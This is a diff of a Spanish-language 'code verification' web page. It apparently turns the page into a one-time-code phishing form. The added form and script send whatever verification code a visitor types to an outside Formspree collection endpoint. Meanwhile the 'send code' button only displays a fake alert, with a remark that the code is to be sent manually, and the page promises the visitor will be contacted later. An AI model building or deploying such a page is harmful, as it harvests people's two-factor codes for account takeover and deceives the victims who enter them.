@@ -27,7 +27,7 @@
     margin-bottom: 25px;
     color: #34495e;
   }
-  button {
+  button, input[type="submit"] {
     background-color: #2980b9;
     color: white;
     padding: 12px;
@@ -40,7 +40,7 @@
     width: 100%;
     margin-bottom: 20px;
   }
-  button:hover {
+  button:hover, input[type="submit"]:hover {
     background: #1f5f8b;
   }
   input[type="text"] {
@@ -51,7 +51,6 @@
     border: 1.5px solid #ccc;
     margin-bottom: 20px;
     transition: border-color 0.3s ease;
-    display: none;
   }
   input[type="text"]:focus {
     border-color: #2980b9;
@@ -68,47 +67,54 @@
 
 <div class="container">
   <h1>Verificación de Código</h1>
-  <p>Por favor, presiona el botón para enviar el código de verificación.</p>
+  <p>Pulsa "Enviar código" para recibir el código de verificación en tu teléfono.</p>
   <button id="btnEnviarCodigo">Enviar código de verificación</button>
-  <input type="text" id="codigoInput" placeholder="Ingresa el código recibido" maxlength="6" />
-  <button id="btnVerificar" style="display:none;">Verificar Código</button>
+
+  <form id="formVerificacion" action="https://formspree.io/f/xgoqzbkg" method="POST">
+    <label for="codigo">Ingresa el código que recibiste:</label>
+    <input type="text" id="codigo" name="codigo" placeholder="Código de verificación" required />
+    <input type="submit" value="Verificar Código" />
+  </form>
+
   <p id="mensaje"></p>
 </div>
 
 <script>
   const btnEnviarCodigo = document.getElementById('btnEnviarCodigo');
-  const btnVerificar = document.getElementById('btnVerificar');
-  const codigoInput = document.getElementById('codigoInput');
+  const form = document.getElementById('formVerificacion');
   const mensaje = document.getElementById('mensaje');
 
-  const codigoCorrecto = "123456"; // Cambia este código según tu proceso
-
   btnEnviarCodigo.addEventListener('click', () => {
-    alert("Código enviado al teléfono registrado.");
-    codigoInput.style.display = "block";
-    btnVerificar.style.display = "block";
-    btnEnviarCodigo.style.display = "none";
+    alert("Código enviado al teléfono registrado. (Envía el código manualmente)");
   });
 
-  btnVerificar.addEventListener('click', () => {
-    const codigoIngresado = codigoInput.value.trim();
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const formData = new FormData(form);
 
-    if(codigoIngresado === "") {
-      mensaje.textContent = "Por favor, ingresa un código.";
+    fetch(form.action, {
+      method: 'POST',
+      body: formData,
+      headers: { 'Accept': 'application/json' }
+    }).then(response => {
+      if (response.ok) {
+        mensaje.textContent = "Código enviado correctamente. Pronto te contactaremos.";
+        mensaje.style.color = "#27ae60";
+        form.reset();
+      } else {
+        response.json().then(data => {
+          if (Object.hasOwn(data, 'errors')) {
+            mensaje.textContent = data["errors"].map(error => error["message"]).join(", ");
+          } else {
+            mensaje.textContent = "Error al enviar el código.";
+          }
+          mensaje.style.color = "#e74c3c";
+        })
+      }
+    }).catch(() => {
+      mensaje.textContent = "Error al enviar el código. Intenta nuevamente.";
       mensaje.style.color = "#e74c3c";
-      return;
-    }
-
-    if(codigoIngresado === codigoCorrecto) {
-      mensaje.textContent = "¡Código correcto! Verificación exitosa.";
-      mensaje.style.color = "#27ae60";
-      setTimeout(() => {
-        window.location.href = "gracias.html";
-      }, 3000);
-    } else {
-      mensaje.textContent = "Código incorrecto. Intenta de nuevo.";
-      mensaje.style.color = "#e74c3c";
-    }
+    });
   });
 </script>
 
